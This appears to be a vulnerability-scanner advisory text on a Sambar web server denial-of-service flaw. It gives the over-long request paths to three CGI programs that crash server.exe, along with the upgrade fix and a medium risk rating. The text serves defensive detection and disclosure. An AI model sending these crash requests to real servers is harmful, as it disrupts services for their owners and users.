It is possible to kill the Sambar web server 'server.exe'
by sending it a long request like:
	/cgi-win/testcgi.exe?XXXX...X
	/cgi-win/cgitest.exe?XXXX...X
	/cgi-win/Pbcgi.exe?XXXXX...X
(or maybe in /cgi-bin/)

A cracker may use this flaw to make your server crash 
continuously, preventing you from working properly.

Solution : upgrade your server to Sambar 51p or delete those CGI.

Risk factor : Medium";
